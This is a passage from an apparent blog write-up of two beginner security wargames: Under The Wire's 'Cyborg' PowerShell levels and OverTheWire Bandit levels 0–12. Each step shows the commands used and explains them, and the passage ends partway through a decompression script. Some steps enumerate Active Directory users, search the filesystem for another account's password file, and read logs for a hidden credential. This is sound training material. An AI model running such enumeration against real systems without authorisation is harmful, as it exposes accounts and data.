,OU=T-85,OU=X-Wing,DC=underthewire,DC=tech Enabled : False GivenName : Benny logonhours : {0, 0, 0, 0...} Name : Rowray, Benny ObjectClass : user ObjectGUID : c9aad4f3-3e4f-46b5-84db-2bb7105796dd SamAccountName : Benny.Rowray SID : S-1-5-21-758131494-606461608-3556270690-1647 Surname : [REDACTED] UserPrincipalName : Benny.Rowray PS C:\\users\\cyborg5\\desktop\u0026gt; We can then use the ls command to list the contents of the desktop directory.\nPS C:\\users\\cyborg5\\desktop\u0026gt; ls Directory: C:\\users\\cyborg5\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:45 AM 0 [REDACTED] PS C:\\users\\cyborg5\\desktop\u0026gt; With that, we have the password for the next level.\nCyborg level 6-7 # For this challenge, we are required to find the decoded text of the string within the file on the desktop in order to get the password for level 7.\nThe password for cyborg7 is the decoded text of the string within the file on the desktop. NOTE: – The password is the last word of the string. For example, if it is “I like PowerShell”, the password would be “powershell”. – The password will be lowercase no matter how it appears on the screen. – There are no spaces in the answer. The contents of the file are encoded using base64 as shown below.\nPS C:\\users\\cyborg6\\desktop\u0026gt; type \u0026#34;.\\cypher.txt\u0026#34; [REDACTED] PS C:\\users\\cyborg6\\desktop\u0026gt; We are required to decode this text to get the password for the next level. Below is the command I used to decode the text.\n[System.Text.Encoding]::UTF8.GetString([Sy stem.Convert]::FromBase64String($(gc .\\cypher.txt))) Below is a breakdown of the command.\ngc .\\cypher.txt\ngc is the alias for Get-Content Reads the content of the file cypher.txt in the current directory [System.Convert]::FromBase64String()\nTakes the Base64-encoded string from the file Converts it to a byte array (the raw binary data) [System.Text.Encoding]::UTF8.GetString()\nTakes the byte array from the previous step Decodes it into a UTF-8 string (human-readable text) Below is the output of the command.\nPS C:\\users\\cyborg6\\desktop\u0026gt; [System.Text.Encoding]::UTF8.GetString([Sy stem.Convert]::FromBase64String($(gc .\\cypher.txt))) [REDACTED] PS C:\\users\\cyborg6\\desktop\u0026gt; With the hash we got, we can use online tools too to decrypt the hash to get the password as well.\nCyborg level 7-8 # For this challenge, we are required to find the binary that automatically starts when cyborg7 logs in to the system. The binary name is the password for level 8.\nThe password for cyborg8 is the executable name of a program that will start automatically when cyborg7 logs in. NOTE: – The password will be lowercase no matter how it appears on the screen. We shall use this command as shown below.\nGet-WmiObject Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List What this command does is as explained below.\nGet-WmiObject Win32_StartupCommand\nUses the WMI (Windows Management Instrumentation) class Win32_StartupCommand Retrieves all programs configured to run at system startup or user login | Select-Object Name, command, Location, User\nFilters the output to show only these specific properties: Name: The display name of the startup item Command: The actual command/program that runs Location: Where the startup entry is configured (registry, startup folder, etc.) User: Which user account the startup item applies to | Format-List\nDisplays the results in a vertical list format (one property per line) Alternative to the default table view (Format-Table) Below is the output of the command.\nPS C:\\users\\cyborg7\\desktop\u0026gt; Get-WmiObject Win32_StartupCommand | Selec t-Object Name, command, Location, User | Format-List Name : [REDACTED] command : C:\\program files\\SkyNet\\skynet.exe Location : HKU\\S-1-5-21-758131494-606461608-3556270690-1140\\SOFTWARE\\M icrosoft\\Windows\\CurrentVersion\\Run User : underthewire\\cyborg7 Cyborg level 8-9 # For this level, we are required to get the internet zone from which the image on the desktop was downloaded from. This is the password for level 9.\nThe password for cyborg9 is the Internet zone that the picture on the desktop was downloaded from. NOTE: – The password will be lowercase no matter how it appears on the screen. Zone information is usually recorded in the Zone.Identifier data stream. We can now easily view the stream using the command below.\nget-content .\\1_qs5nwlcl7f_-SwNlQvOrAw.png -stream Zone.Identifier Below is a breakdown of the command.\nGet-Content\nPowerShell cmdlet for reading file contents .\\1_qs5nwlcl7f_-SwNlQvOrAw.png\nSpecifies the PNG image file in the current directory Stream Zone.Identifier\nAccesses the alternate data stream (ADS) named \u0026ldquo;Zone.Identifier\u0026rdquo; This is a special hidden metadata stream that Windows adds to downloaded files Below is the output of the command.\nPS C:\\users\\cyborg8\\desktop\u0026gt; get-content .\\1_qs5nwlcl7f_-SwNlQvOrAw.png -stream Zone.Identifier [ZoneTransfer] ZoneId=[REDACTED] Cyborg level 9-10 # For this level, we need to find the active directory user with a phone number 876-5309 to find their first name and then concatenate it with the name of the file on the desktop of the user cyborg9.\nThe password for cyborg10 is the first name of the user with the phone number of 876-5309 listed in Active Directory PLUS the name of the file on the desktop. NOTE: – If the first name “chris” and the file on the desktop is called “23”, then the password is “chris23”. – The password will be lowercase no matter how it appears on the screen. I used the following command to get the name of the user.\n(Get-ADUser -Properties officephone -Filte r * | ? {$_.officephone -eq \u0026#34;876-5309\u0026#34;}).GivenName Below is the breakdown of the command.\nGet-ADUser -Properties officephone -Filter *\nGet-ADUser: Retrieves user accounts from Active Directory Properties officephone: Includes the office phone number in results (not returned by default) Filter *: Returns all user accounts (no filtering at the initial query level) | ? {$_.officephone -eq \u0026quot;876-5309\u0026quot;}\n|: Pipes the results to the next command ?: Alias for Where-Object (filters the results) $_.officephone -eq \u0026quot;876-5309\u0026quot;: Only keeps users whose office phone exactly matches \u0026ldquo;876-5309\u0026rdquo; .GivenName\nExtracts just the first name (GivenName) property from the filtered results Parentheses ( )\nEnsures the entire pipeline completes before selecting GivenName Below is the output of the command followed by the contents on the desktop listed using the command ls\nPS C:\\users\\cyborg9\\desktop\u0026gt; (Get-ADUser -Properties officephone -Filte r * | ? {$_.officephone -eq \u0026#34;876-5309\u0026#34;}).GivenName [REDACTED] PS C:\\users\\cyborg9\\desktop\u0026gt; ls Directory: C:\\users\\cyborg9\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:45 AM 0 99 Cyborg level 10-11 # For this level, we need to find the description for the applocker executable deny policy for ill_be_back.exe and then concatenate it with the name of the file on the desktop of the user cyborg10.\nThe password for cyborg11 is the description of the Applocker Executable deny policy for ill_be_back.exe PLUS the name of the file on the desktop. NOTE: – If the description is “green$” and the file on the desktop is called “28”, then the password is “green$28”. – The password will be lowercase no matter how it appears on the screen. We shall use the following the command.\n$($(Get-AppLockerPolicy -Effective).RuleCollections.Description + $(ls).name) Below is the breakdown of the commands used.\n$(Get-AppLockerPolicy -Effective).RuleCollections.Description\nGet-AppLockerPolicy -Effective: Retrieves the currently applied AppLocker policies .RuleCollections.Description: Extracts the description fields from all rule collections Wrapped in $() to evaluate as a subexpression $(ls).name\nls: Alias for Get-ChildItem (lists files/folders in current directory) .name: Extracts just the names of the items Wrapped in $() to evaluate as a subexpression The + operator\nConcatenates (combines) the two collections of strings Outer $()\nCombines everything into a single output expression Below is the output of the command.\nPS C:\\users\\cyborg10\\desktop\u0026gt; $($(Get-AppLockerPolicy -Effective).RuleC ollections.Description + $(ls).name) [REDACTED] PS C:\\users\\cyborg10\\desktop\u0026gt; Cyborg level 11-12 # For this challenge, the password is located in IIS log and we are told it is Mozilla or Opera\nThe password for cyborg12 is located in the IIS log. The password is not Mozilla or Opera. NOTE: – The password will be lowercase no matter how it appears on the screen. We shall use the following command.\nGet-Content -Path ..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex160413.log | Select-String -NotMatch -Pattern \u0026#34;Mozilla|Opera\u0026#34; Below is a breakdown of the command.\nGet-Content -Path ..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1/u_ex160413.log\nReads the IIS log file from the specified path The ..\\..\\.. navigates up three directory levels from the current location u_ex160413.log is an IIS log file (April 13, 2016) in W3SVC1 (typically the Default Web Site) | (Pipeline)\nSends the log file contents to the next command Select-String -NotMatch -Pattern \u0026quot;Mozilla|Opera\u0026quot;\nFilters the log entries to show only lines that DON\u0026rsquo;T contain: \u0026ldquo;Mozilla\u0026rdquo; (used by Firefox, Chrome, and many other browsers) \u0026ldquo;Opera\u0026rdquo; (Opera browser) NotMatch inverts the matching logic Below is the output of the command.\nPS C:\\users\\cyborg11\\desktop\u0026gt; Get-Content -Path ..\\..\\..\\inetpub\\logs\\L ogFiles\\W3SVC1\\u_ex160413.log | Select-String -NotMatch -Pattern \u0026#34;Mozil la|Opera\u0026#34; #Software: Microsoft Internet Information Services 8.5 #Version: 1.0 #Date: 2016-04-13 04:14:01 #Fields: date time s-sitename s-computername s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs-version cs(User-Agent) cs(Cookie) cs(Referer) cs-host sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken 2016-04-13 04:14:12 W3SVC1 Century 172.31.45.65 GET / - 80 - 172.31.45.65 HTTP/1.1 LordHelmet/5.0+(CombTheDesert)+Password+is:[REDACTED] - - century.underthewire.tech 200 0 0 925 118 0 PS C:\\users\\cyborg11\\desktop\u0026gt; Cyborg level 12-13 # The password for the next level is the first four characters of the base64 encoded full path of the file that started the i_heart_robots service, plus the name of the file on the desktop.\nThe password for cyborg13 is the first four characters of the base64 encoded full path to the file that started the i_heart_robots service PLUS the name of the file on the desktop. NOTE: – An example of a full path would be ‘c:\\some_folder\\test.exe’. – Be sure to use ‘unicode’ in your encoding. – If the encoded base64 is “rwmed2fdreewrt34t” and the file on the desktop is called “_address”, then the password is “rwme_address”. – The password will be lowercase no matter how it appears on the screen. We shall the following one-liner command.\n$((([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($(Get-WmiObject win32_service | where {$_.Name -eq \u0026#34;i_heart_robots\u0026#34;}).PathName))[0..3]) -join \u0026#34;\u0026#34;) + $(ls).name) Below is a breakdown of the command.\nGet-WmiObject win32_service | where {$_.Name -eq \u0026quot;i_heart_robots\u0026quot;}\nQueries WMI for a service named \u0026ldquo;i_heart_robots\u0026rdquo; Returns the service object if found [System.Text.Encoding]::UTF8.GetBytes($(...).PathName)\nTakes the service\u0026rsquo;s executable path Converts it to UTF-8 encoded bytes [Convert]::ToBase64String(...)\nConverts the byte array to a Base64 string (...)[0..3]\nTakes only the first 4 characters of the Base64 string (...) -join \u0026quot;\u0026quot;\nEnsures the characters are combined as a single string $(ls).name\nGets names of all files in current directory (ls = Get-ChildItem) Below is the output of the command.\nPS C:\\users\\cyborg12\\desktop\u0026gt; $((([Convert]::ToBase64String([System.Tex t.Encoding]::UTF8.GetBytes($(Get-WmiObject win32_service | where {$_.Na me -eq \u0026#34;i_heart_robots\u0026#34;}).PathName))[0..3]) -join \u0026#34;\u0026#34;) + $(ls).name) [REDACTED] Cyborg level 13-14 # Below is the objectives and description of the challenge.\nThe password cyborg14 is the number of days the refresh interval is set to for DNS aging for the underthewire.tech zone PLUS the name of the file on the desktop. NOTE: – If the days are set to “08:00:00:00” and the file on the desktop is called “_tuesday”, then the password is “8_tuesday”. – The password will be lowercase no matter how it appears on the screen. Below is the command I used.\n$($($(Get-DnsServerZoneAging -Name underthewire.tech).RefreshInterval).ToString().Split(\u0026#34;.\u0026#34;)[0] + $(ls).name) Here is the breakdown of the command.\nGet-DnsServerZoneAging -Name underthewire.tech\nRetrieves aging/scavenging properties for the DNS zone \u0026ldquo;underthewire.tech\u0026rdquo; Requires DNS Server module and administrative privileges ).RefreshInterval\nGets the refresh interval value (how often aging/scavenging occurs) Typically returns a TimeSpan object ).ToString().Split(\u0026quot;.\u0026quot;)[0]\nConverts TimeSpan to string (format \u0026ldquo;days.hours:minutes:seconds\u0026rdquo;) Splits at the decimal point and takes the first part (days) $(ls).name\nGets names of all files in current directory (ls = Get-ChildItem) + $(ls).name\nConcatenates the day value with all filenames Below is the output of the command.\nPS C:\\Users\\cyborg13\\desktop\u0026gt;$($($(Get-DnsServerZoneAging -Name underthewire.tech).RefreshInterval).ToString().Split(\u0026#34;.\u0026#34;)[0] + $(ls).name) [REDACTED] Cyborg level 14-15 # Below is the objective of the challenge.\nThe password for cyborg15 is the caption for the DCOM application setting for application ID {59B8AFA0-229E-46D9-B980-DDA2C817EC7E} PLUS the name of the file on the desktop. NOTE: – If the caption is “dcom” and the file on the desktop is called “_address”, then the password is “dcom_address”. – The password will be lowercase no matter how it appears on screen. To get information about DCOM applicatios we can use again the Get-WmiObject cmdlet and filter for win32_DCOMApplication class, we shall use the following command.\n(Get-WmiObject -Class \u0026#34;Win32_DCOMApplication\u0026#34; -Filter \u0026#34;AppId=\u0026#39;{59B8AFA0-229E-46D9-B980-DDA2C817EC7E}\u0026#39;\u0026#34; ).Caption Here is the breakdown of the command.\nGet-WmiObject\nThe PowerShell cmdlet that retrieves WMI class instances Class \u0026quot;Win32_DCOMApplication\u0026quot;\nSpecifies the WMI class that represents DCOM applications Contains information about all registered DCOM applications on the system Filter \u0026quot;AppId='{59B8AFA0-229E-46D9-B980-DDA2C817EC7E}'\u0026quot;\nFilters to find only the DCOM application with this specific AppID (GUID) The GUID {59B8AFA0-229E-46D9-B980-DDA2C817EC7E} identifies a particular DCOM application .Caption\nRetrieves the \u0026ldquo;Caption\u0026rdquo; property of the found DCOM application This typically contains the human-readable name of the application The output of the command is as follows and the file on the desktop directory.\nPS C:\\users\\cyborg14\\desktop\u0026gt; (Get-WmiObject -Class \u0026#34;Win32_DCOMApplicat ion\u0026#34; -Filter \u0026#34;AppId=\u0026#39;{59B8AFA0-229E-46D9-B980-DDA2C817EC7E}\u0026#39;\u0026#34; ).Caption [REDACTED] PS C:\\users\\cyborg14\\desktop\u0026gt; ls Directory: C:\\users\\cyborg14\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:45 AM 0 _objects PS C:\\users\\cyborg14\\desktop\u0026gt; Cyborg level 15 # We are done with the entire cyborg challenge series.\nCongratulations! You have successfully made it to the end! Try your luck with other games brought to you by the Under The Wire team. Thanks for playing! Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. Under the Wire... PowerShell Training for the People! PS C:\\users\\cyborg15\\desktop\u0026gt; :) :) :o ","date":"10 June 2025","externalUrl":null,"permalink":"/posts/cyborg/","section":"Posts","summary":"underthewire wargames cyborg series","title":"Underthewire cyborg war games","type":"posts"},{"content":"","date":"4 June 2025","externalUrl":null,"permalink":"/tags/bandit/","section":"Tags","summary":"","title":"Bandit","type":"tags"},{"content":"","date":"4 June 2025","externalUrl":null,"permalink":"/tags/git/","section":"Tags","summary":"","title":"Git","type":"tags"},{"content":" bandit level 0-1 # For this section we are required to log in to the game through ssh, the syntax is as shown below\nssh bandit0@bandit.labs.overthewire.org -p 2220 where the -p refers to port in which we are required to specify the port on which the ssh service is running on, as for our scenario, the ssh service is running on port 2220 as indicated in the webpage as shown below.\nAfter logging in, we first list the contents of the current directory we are in using the ls command to see what we can find and then concatenate the file we find to see if we can find the password for the next level.\nbandit0@bandit:~$ pwd /home/bandit0 bandit0@bandit:~$ ls readme bandit0@bandit:~$ cat readme Congratulations on your first steps into the bandit game!! Please make sure you have read the rules at https://overthewire.org/rules/ If you are following a course, workshop, walkthrough or other educational activity, please inform the instructor about the rules as well and encourage them to contribute to the OverTheWire community so we can keep these games free! The password you are looking for is: [Redacted] as seen above we have found the password for the next level which we can use to log in to the next level via ssh.\nbandit level 1-2 # In this section, the lesson we are required to learn, is how to read files with dashed file names.\nAfter doing research online, the best way to read the contents of the file is by prefixing the path of the file as shown below.\nbandit1@bandit:~$ cat ./- [Redacted] bandit1@bandit:~$ bandit level 2-3 # In this section, we are required to research online how to read files with spaces. After doing research online, we can read files with spaces in the following ways, as shown below.\nbandit2@bandit:~$ ls spaces in this filename bandit2@bandit:~$ cat \u0026#34;spaces in this filename\u0026#34; [Redacted] bandit2@bandit:~$ cat spaces\\ in\\ this\\ filename [Redacted] bandit2@bandit:~$ As seen above, we can read contents of a file with spaces by either enclosing the file in double quotes to be able to concatenate the file contents or by escaping the space characters with a backslash .\nbandit level 3-4 # In this section we are required to know how to change directory location using the cd command and then how to list and open hidden files i a directory\nbandit3@bandit:~/inhere$ cd .. bandit3@bandit:~$ ls inhere bandit3@bandit:~$ cd inhere/ bandit3@bandit:~/inhere$ ls -a . .. ...Hiding-From-You bandit3@bandit:~/inhere$ cat ...Hiding-From-You [REDACTED] As seen above to list all the contetns of a directory, we use the command ls -a where the -a flag specifies that we lsit everything including hidden files as seen on the man page below.\nLS(1) User Commands LS(1) NAME ls - list directory contents SYNOPSIS ls [OPTION]... [FILE]... DESCRIPTION List information about the FILEs (the current directory by default). Sort entries alphabetically if none of -cftuvSUX nor --sort is specified. Mandatory arguments to long options are mandatory for short options too. -a, --all do not ignore entries starting with . -A, --almost-all do not list implied . and .. bandit level 4-5 # In this section, we are required to find a file that is human-readable, for this section we shall be using the command file to locate the file that is human-readable as shown below.\nbandit4@bandit:~$ ls inhere bandit4@bandit:~$ cd inhere/ bandit4@bandit:~/inhere$ ls -file00 -file01 -file02 -file03 -file04 -file05 -file06 -file07 -file08 -file09 bandit4@bandit:~/inhere$ file ./* ./-file00: PGP Secret Sub-key - ./-file01: data ./-file02: data ./-file03: data ./-file04: data ./-file05: data ./-file06: data ./-file07: ASCII text ./-file08: data ./-file09: data bandit4@bandit:~/inhere$ As seen above, we have only one file with ASCII text that can be read by humans, -file07 . We can now concatenate the file to see the password for the next level\nbandit4@bandit:~/inhere$ cat ./-file07 [REDACTED] bandit level 5-6 # For this level, we are required to search for a file with the following characteristics using the find command.\nhuman-readable 1033 bytes in size not executable Below is the command I used to find the file\nbandit5@bandit:~/inhere$ ls maybehere00 maybehere02 maybehere04 maybehere06 maybehere08 maybehere10 maybehere12 maybehere14 maybehere16 maybehere18 maybehere01 maybehere03 maybehere05 maybehere07 maybehere09 maybehere11 maybehere13 maybehere15 maybehere17 maybehere19 bandit5@bandit:~/inhere$ find -type f -readable -size 1033c ! -executable ./maybehere07/.file2 bandit5@bandit:~/inhere$ cat ./maybehere07/.file2 [REDACTED] Below is the breakdown of the command\nfind -type f -readable -size 1033c ! -executable -type f – regular files only -readable – file is readable by the current user ! -executable – not executable -size 1033c – file size is exactly 1033 bytes (suffix c = bytes) bandit level 6-7 # In this section, we are still required to look for a file with the following characteristics.\nowned by user bandit7 owned by group bandit6 33 bytes in size Below is the command we shall use and its breakdown too.\nfind / -type f -user bandit7 -group bandit6 -size 33c 2\u0026gt;/dev/null / — search from the root of the filesystem (you can change this if you know the likely directory) -type f — regular files -user bandit7 — file is owned by user bandit7 -group bandit6 — file is owned by group bandit6 -size 33c — file size is exactly 33 bytes 2\u0026gt;/dev/null — suppress permission denied errors With that, we are able to find our file and its content as shown below.\nbandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c 2\u0026gt;/dev/null /var/lib/dpkg/info/bandit7.password bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password [REDACTED] bandit level 7-8 # In this section, we are required to utilize the grep command in order to be able to find the password for the next level in a file stored next to the word millionth.\nWe can achieve this in two ways, as shown below.\nbandit7@bandit:~$ ls data.txt bandit7@bandit:~$ cat data.txt | grep -ie millionth millionth [REDACTED] bandit7@bandit:~$ grep -ie millionth data.txt millionth [REDACTED] bandit7@bandit:~$ Below is the breakdown of the commands used above.\ncat data.txt | grep -ie millionth This command outputs the contents of the file data.txt. | (pipe) The pipe takes the output of the cat command and sends it as input to the next command (grep). grep -ie millionth grep is used to search for lines that match a pattern. -i makes the search case-insensitive (Millionth, millionth, MILLIONTH, etc., will all match). -e allows you to specify the pattern explicitly (millionth in this case). grep -ie millionth data.txt grep -ie millionth grep is used to search for lines that match a pattern. -i makes the search case-insensitive (Millionth, millionth, MILLIONTH, etc., will all match). -e allows you to specify the pattern explicitly (millionth in this case). data.txt specifies the file on to which we are required to look for the pattern we want. bandit level 8-9 # In this section, we are required to look for the password in the file for the next level in the data.txt file, and it occurs only once. Below is the command I used to look for the password.\nbandit8@bandit:~$ ls data.txt bandit8@bandit:~$ sort data.txt | uniq -c | grep \u0026#34; 1 \u0026#34; [REDACTED] Below is a breakdown of the command.\nsort data.txt Sorts all lines alphabetically so duplicates are adjacent. uniq -c Counts the number of occurrences of each unique line. grep \u0026#34; 1 \u0026#34; Filters to show only lines that appear once. bandit level 9-10 # In this section, we are required to look for a string that is the password for the next level with the following characteristics.\nThe password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters. Below is the command I used to find the password\nbandit9@bandit:~$ strings data.txt | grep \u0026#34;=.*\u0026#34; ,k=? @k*= ========== the #e=in g+=ypF ea=+ K\u0026gt;=*\u0026lt; ========== password{k =========== is 1R=j/ e=\u0026lt;2g% +G/YD= =wDk =3?lOt [REDACTED] =D!f H =sS Here is the breakdown of the command.\nstrings data.txt Extracts human-readable strings from a binary file. grep \u0026#39;=.*\u0026#39; Filters lines that contain one or more = characters followed by other text (the likely format for the password). bandit level 10-11 # In this section, the password is base64 encoded, we are required to decrypt the base64 encoding to find the password for the next level.\nbandit10@bandit:~$ ls data.txt bandit10@bandit:~$ cat data.txt | base64 -d [REDACTED] bandit10@bandit:~$ Below is a breakdown of the command used.\ncat data.txt This reads and prints the contents of the file data.txt to standard output. | (pipe) Takes the output of cat data.txt and passes it as input to the next command. base64 -d This decodes base64-encoded data. -d stands for decode (same as --decode). bandit level 11-12 # For this section, our password is encoded using rot13, we are required to find it in the data.txt file. Below is the command we shall use to find the password for the next level, as shown below.\nbandit11@bandit:~$ cat data.txt | tr \u0026#39;A-Za-z\u0026#39; \u0026#39;N-ZA-Mn-za-m\u0026#39; The password is [REDACTED] Below is the breakdown of the command\ntr = translate characters. \u0026#39;A-Za-z\u0026#39; – the full alphabet (uppercase and lowercase). \u0026#39;N-ZA-Mn-za-m\u0026#39; – the ROT13-shifted version. This command replaces each letter with the one 13 positions later. bandit level 12-13 # In this section, our password is stored in a file data.txt, however the contents of this file are required to be converted to a binary which is compressed several times and we are required to decompress it until we find the password for the next level.\nBelow is how I solved the problem\nbandit12@bandit:~$ ls data.txt bandit12@bandit:~$ file data.txt data.txt: ASCII text bandit12@bandit:~$ cd /tmp bandit12@bandit:/tmp$ mkdir n00b bandit12@bandit:/tmp$ cd n00b bandit12@bandit:/tmp/n00b$ cp /home/bandit12/data.txt . bandit12@bandit:/tmp/n00b$ xxd -r data.txt \u0026gt; data.bin bandit12@bandit:/tmp/n00b$ file data.bin data.bin: gzip compressed data, was \u0026#34;data2.bin\u0026#34;, last modified: Thu Apr 10 14:22:57 2025, max compression, from Unix, original size modulo 2^32 585 bandit12@bandit:/tmp/n00b$ mv data data.gz bandit12@bandit:/tmp/n00b$ gunzip data.gz bandit12@bandit:/tmp/n00b$ file data data: POSIX tar archive (GNU) bandit12@bandit:/tmp/n00b$ mv data data.tar bandit12@bandit:/tmp/n00b$ tar -xf data.tar bandit12@bandit:/tmp/n00b$ file data data: cannot open `data\u0026#39; (No such file or directory) bandit12@bandit:/tmp/n00b$ ls data5.bin data.tar data.txt bandit12@bandit:/tmp/n00b$ file data5.bin data5.bin: POSIX tar archive (GNU) bandit12@bandit:/tmp/n00b$ mv data5.bin data.tar bandit12@bandit:/tmp/n00b$ tar -xf data.tar bandit12@bandit:/tmp/n00b$ file data data: cannot open `data\u0026#39; (No such file or directory) bandit12@bandit:/tmp/n00b$ ls data6.bin data.tar data.txt bandit12@bandit:/tmp/n00b$ file data6.bin data6.bin: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/n00b$ mv data6.bin data.bz2 bandit12@bandit:/tmp/n00b$ bunzip2 data.bz2 bandit12@bandit:/tmp/n00b$ file data data: POSIX tar archive (GNU) bandit12@bandit:/tmp/n00b$ mv data data.tar bandit12@bandit:/tmp/n00b$ tar -xf data.tar bandit12@bandit:/tmp/n00b$ file data data: cannot open `data\u0026#39; (No such file or directory) bandit12@bandit:/tmp/n00b$ ls data8.bin data.tar data.txt bandit12@bandit:/tmp/n00b$ file data8.bin data8.bin: gzip compressed data, was \u0026#34;data9.bin\u0026#34;, last modified: Thu Apr 10 14:22:57 2025, max compression, from Unix, original size modulo 2^32 49 bandit12@bandit:/tmp/n00b$ mv data8.bin data.gz bandit12@bandit:/tmp/n00b$ gunzip data.gz bandit12@bandit:/tmp/n00b$ ls data data.tar data.txt bandit12@bandit:/tmp/n00b$ file data data: ASCII text bandit12@bandit:/tmp/n00b$ cat data The password is [REDACTED] Below is a breakdown of what is happening\nStep-by-step breakdown:\nls and file data.txt bandit12@bandit:~$ ls data.txt bandit12@bandit:~$ file data.txt data.txt: ASCII text You list the file, confirm data.txt exists. file data.txt shows it’s ASCII text — consistent with a hexdump (textual hex representation of binary data). Create and move to a working directory bandit12@bandit:/tmp$ mkdir n00b bandit12@bandit:/tmp$ cd n00b Creates a safe workspace /tmp/n00b to avoid clutter and permission issues. Copy data.txt to working dir bandit12@bandit:/tmp/n00b$ cp /home/bandit12/data.txt . Copy the hexdump file here to work on it. Reverse the hexdump back to binary bandit12@bandit:/tmp/n00b$ xxd -r data.txt \u0026gt; data.bin xxd -r converts the hexdump text in data.txt back into the original binary file data.bin. Check what data.bin is bandit12@bandit:/tmp/n00b$ file data.bin data.bin: gzip compressed data, was \u0026#34;data2.bin\u0026#34;, last modified: ..., original size 585 file identifies data.bin as a gzip compressed file. Rename and decompress gzip file bandit12@bandit:/tmp/n00b$ mv data data.gz bandit12@bandit:/tmp/n00b$ gunzip data.gz Rename (the command here says mv data data.gz, but likely it should be mv data.bin data.gz). Then decompress with gunzip, producing a file named data. Check what data is bandit12@bandit:/tmp/n00b$ file data data: POSIX tar archive (GNU) The file is now a tar archive. Rename and extract the tar archive bandit12@bandit:/tmp/n00b$ mv data data.tar bandit12@bandit:/tmp/n00b$ tar -xf data.tar Renamed data to data.tar. Extracted contents with tar -xf data.tar. Check the extracted files bandit12@bandit:/tmp/n00b$ ls data5.bin data.tar data.txt Extraction created data5.bin. Check data5.bin file type bandit12@bandit:/tmp/n00b$ file data5.bin data5.bin: POSIX tar archive (GNU) data5.bin is another tar archive. Rename and extract again bandit12@bandit:/tmp/n00b$ mv data5.bin data.tar bandit12@bandit:/tmp/n00b$ tar -xf data.tar Rename data5.bin to data.tar and extract. Check extracted files again bandit12@bandit:/tmp/n00b$ ls data6.bin data.tar data.txt New file data6.bin appears. Check data6.bin file type bandit12@bandit:/tmp/n00b$ file data6.bin data6.bin: bzip2 compressed data, block size = 900k data6.bin is a bzip2 compressed file. Rename and decompress bzip2 file bandit12@bandit:/tmp/n00b$ mv data6.bin data.bz2 bandit12@bandit:/tmp/n00b$ bunzip2 data.bz2 Rename to .bz2 extension, decompress using bunzip2. Decompression produces data. Check new data file type bandit12@bandit:/tmp/n00b$ file data data: POSIX tar archive (GNU) It’s another tar archive. Rename and extract tar archive again bandit12@bandit:/tmp/n00b$ mv data data.tar bandit12@bandit:/tmp/n00b$ tar -xf data.tar Check contents again bandit12@bandit:/tmp/n00b$ ls data8.bin data.tar data.txt New file data8.bin. Check data8.bin type bandit12@bandit:/tmp/n00b$ file data8.bin data8.bin: gzip compressed data, was \u0026#34;data9.bin\u0026#34;, last modified: ..., original size 49 data8.bin is gzip compressed data again. Rename and decompress gzip again bandit12@bandit:/tmp/n00b$ mv data8.bin data.gz bandit12@bandit:/tmp/n00b$ gunzip data.gz List files and check final file bandit12@bandit:/tmp/n00b$ ls data data.tar data.txt bandit12@bandit:/tmp/n00b$ file data data: ASCII text Finally, the decompressed data file is ASCII text — likely the password. Display the password bandit12@bandit:/tmp/n00b$ cat data The password is [REDACTED] To simplify, we can automate by using a bash script as below.\n#!/bin/bash set -euo pipefail # Check for required commands for cmd in file xxd gunzip bunzip2 tar xzcat xz; do if ! command -v \u0026#34;$cmd\u0026#34; \u0026amp;\u0026gt;/dev/null; then echo \u0026#34;Error: required command \u0026#39;$cmd\u0026#39; not found.\u0026#34; exit 1 fi done WORKDIR=$(pwd) filename=\u0026#34;data.bin\u0026#34; function cleanup { # Optional: cleanup temporary files if needed : } trap cleanup EXIT while true; do if [[ ! -f \u0026#34;$filename\u0026#34; ]]; then echo \u0026#34;Error: file \u0026#39;$filename\u0026#39; not found.\u0026#34; exit 1 fi filetype=$(file -b \u0026#34;$filename\u0026#34;) echo \u0026#34;[*] Current file ($filename) type: $filetype\u0026#34; case \u0026#34;$filetype\u0026#34; in *\u0026#34;gzip compressed data\u0026#34;*) newfile=\u0026#34;data_$(date +%s).gz\u0026#34; mv \u0026#34;$filename\u0026#34; \u0026#34;$newfile\u0026#34; echo \u0026#34;[*] Decompressing gzip: $newfile\u0026#34; gunzip \u0026#34;$newfile\u0026#34; filename=\u0026#34;${newfile%.gz}\u0026#34; ;; *\u0026#34;bzip2 compressed data\u0026#34;*) newfile=\u0026#34;data_$(date +%s).bz2\u0026#34; mv \u0026#34;$filename\u0026#34; \u0026#34;$newfile\u0026#34; echo \u0026#34;[*] Decompressing bzip2: $newfile\u0026#34; bunzip2 \u0026#34;$newfile\u0026#34; filename=\u0026#34;${newfile%.bz2}\u0026#34; ;; *\u0026#34;XZ compressed data\u0026#34;*) newfile=\u0026#34;data_$(date +%s).xz\u0026#34; mv \u0026#34;$filename\u0026#34; \u0026#34;$newfile\u0026#34; echo \u0026#34;[*] Decompressing xz: $newfile\u0026#34; unxz \u0026#34;$newfile\u0026#34; filename=\u0026#34;${newfile%.xz}\u0026#34; ;; *\u0026#34;POSIX tar archive\u0026#34;*) newfile=\u0026#34;data_$(date +%s).tar\u0026#34; mv \u0026#34;$filename\u0026#34; \u0026#34;$newfile\u0026#34; echo \u0026#34;[*] Extracting tar archive: $newfile\u0026#34; mkdir -p extracted_$newfile tar -xf \u0026#34;$newfile\u0026#34; -C extracted_$newfile # Find biggest file in extracted directory nextfile=$(find extracted_$newfile -type f -exec ls -s {} + | sort -nr | head -n1 | awk \u0026#39;{print $2}\u0026#39;) if [[ -z \u0026#34;$nextfile\u0026#34; ]]; then echo \u0026#34;[!] No files found inside the archive.\u0026#34; exit 1 fi filename=\u0026#34;$nextfile\u0026#34; cd \u0026#34;$WORKDIR\u0026#34; # make sure we stay in same dir echo \u0026#34;[*] Next 